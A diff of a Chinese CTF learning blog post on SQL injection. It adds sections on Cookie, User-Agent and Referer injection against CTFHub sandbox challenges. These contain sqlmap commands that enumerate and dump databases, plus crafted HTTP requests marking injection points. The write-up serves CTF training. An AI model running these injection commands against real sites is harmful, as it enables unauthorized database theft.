@@ -22,13 +22,13 @@
 
     <meta name="description" content="某些网站上存在 SQL 的漏洞，我们可以利用漏洞进行 SQL 注入获取数据库的信息。 一般来说网址或请求的末尾带有 ?id&#x3D;1 的字样我们就可以考虑 SQL 注入。 然而我完全不会 SQL，于是 sqlmap 大法好 QWQ 本文一切例题均可在 CTFHub 找到。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="OIer 的 CTF SQL 注入学习笔记">
+<meta property="og:title" content="OIer 的 CTF Web SQL 注入学习笔记">
 <meta property="og:url" content="https://xenonwzh.github.io/ctf-sql-notes/index.html">
 <meta property="og:site_name" content="XenonWZH&#39;s Blog">
 <meta property="og:description" content="某些网站上存在 SQL 的漏洞，我们可以利用漏洞进行 SQL 注入获取数据库的信息。 一般来说网址或请求的末尾带有 ?id&#x3D;1 的字样我们就可以考虑 SQL 注入。 然而我完全不会 SQL，于是 sqlmap 大法好 QWQ 本文一切例题均可在 CTFHub 找到。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-02-10T00:18:52.000Z">
-<meta property="article:modified_time" content="2023-02-10T01:36:46.370Z">
+<meta property="article:modified_time" content="2023-02-13T08:22:20.488Z">
 <meta property="article:author" content="XenonWZH">
 <meta property="article:tag" content="学习笔记">
 <meta property="article:tag" content="CTF">
@@ -41,10 +41,10 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://xenonwzh.github.io/ctf-sql-notes/","path":"ctf-sql-notes/","title":"OIer 的 CTF SQL 注入学习笔记"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://xenonwzh.github.io/ctf-sql-notes/","path":"ctf-sql-notes/","title":"OIer 的 CTF Web SQL 注入学习笔记"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>OIer 的 CTF SQL 注入学习笔记 | XenonWZH's Blog</title>
+<title>OIer 的 CTF Web SQL 注入学习笔记 | XenonWZH's Blog</title>
   
 
 
@@ -147,7 +147,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">sqlmap 介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-sqlmap-%E8%BF%9B%E8%A1%8C-sql-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">使用 sqlmap 进行 SQL 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">3.</span> <span class="nav-text">过滤空格</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">sqlmap 介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-sqlmap-%E8%BF%9B%E8%A1%8C-sql-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">使用 sqlmap 进行 SQL 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">3.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie-%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">Cookie 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ua-%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">UA 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#refer-%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">Refer 注入</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -162,18 +162,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">104</span>
+          <span class="site-state-item-count">105</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-count">123</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -258,12 +258,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="OIer 的 CTF SQL 注入学习笔记 | XenonWZH's Blog">
+      <meta itemprop="name" content="OIer 的 CTF Web SQL 注入学习笔记 | XenonWZH's Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          OIer 的 CTF SQL 注入学习笔记
+          OIer 的 CTF Web SQL 注入学习笔记
         </h1>
 
         <div class="post-meta-container">
@@ -273,9 +273,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-02-10 08:18:52 / 修改时间：09:36:46" itemprop="dateCreated datePublished" datetime="2023-02-10T08:18:52+08:00">2023-02-10</time>
+      <time title="创建时间：2023-02-10 08:18:52" itemprop="dateCreated datePublished" datetime="2023-02-10T08:18:52+08:00">2023-02-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-02-13 16:22:20" itemprop="dateModified" datetime="2023-02-13T16:22:20+08:00">2023-02-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -430,6 +436,35 @@ SQL 注入。</p>
 <p>于是我们执行以下指令即可：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> -D sqli --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/?id=1&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> -D sqli -T kttcekvceq --columns --dump</span><br></pre></td></tr></table></figure>
 <p>于是可获得 flag。</p>
+<h1 id="cookie-注入">Cookie 注入</h1>
+<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt; Cookie
+注入</p>
+<p>利用 brupsuite 抓包，发现注入点在 Cookie 中，于是我们可以使用 sqlmap
+进行 Cookie 注入。</p>
+<p>注意我们需要对 sqlmap 设置 <code>--level 2</code> 才能使其扫描
+Cookie。执行代码如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2 --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2 -D sqli --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://challenge-XXX.sandbox.ctfhub.com:XXXXX/&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2 -D sqli -T hxwrqtoxda --columns --dump</span><br></pre></td></tr></table></figure>
+<h1 id="ua-注入">UA 注入</h1>
+<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt; UA
+注入</p>
+<p>这道题的注入点在 User-Agent 中。</p>
+<p>这时我们使用 brupsuite 抓包，并将信息存储在 <code>test.txt</code>
+以备注入使用（<code>*</code> 表示指定注入的点）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-XXX.sandbox.ctfhub.com:XXXXX</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: *</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<p>于是我们可以用 sqlmap 分析抓包信息。设置 <code>--level 3</code>
+并使用 <code>-p</code> 指定为 <code>User-Agent</code>
+注入即可。执行代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;test.txt&quot; -p User-Agent --level 3 --dbs</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p User-Agent --level 3 -D sqli --tables</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p User-Agent --level 3 -D sqli -T swthkhjyyp --columns --dump</span><br></pre></td></tr></table></figure>
+<h1 id="refer-注入">Refer 注入</h1>
+<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt; Refer
+注入</p>
+<p>我们使用 brupsuite 抓包，并未发现 Refer，于是可以自己构造
+Refer（<code>*</code> 表示指定注入的点）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: challenge-XXX.sandbox.ctfhub.com:XXXXX</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Referer: id=1*</span><br></pre></td></tr></table></figure>
+<p>于是我们可以用 sqlmap 分析抓包信息。设置 <code>--level 5</code>
+并使用 <code>-p</code> 指定为 <code>referer</code>
+注入即可。执行代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;test.txt&quot; -p referer --level 5 --dbs</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p referer --level 5 -D sqli --tables</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p referer --level 5 -D sqli -T vdcwkjvvjz --columns --dump</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -449,11 +484,14 @@ SQL 注入。</p>
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/ctf-password-notes/" rel="prev" title="OIer 的 CTF 密码口令学习笔记">
-                  <i class="fa fa-chevron-left"></i> OIer 的 CTF 密码口令学习笔记
+                <a href="/ctf-password-notes/" rel="prev" title="OIer 的 CTF Web 密码口令学习笔记">
+                  <i class="fa fa-chevron-left"></i> OIer 的 CTF Web 密码口令学习笔记
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/ctf-flow-notes/" rel="next" title="OIer 的 CTF Misc 流量分析学习笔记">
+                  OIer 的 CTF Misc 流量分析学习笔记 <i class="fa fa-chevron-right"></i>
+                </a>
             </div>
           </div>
     </footer>
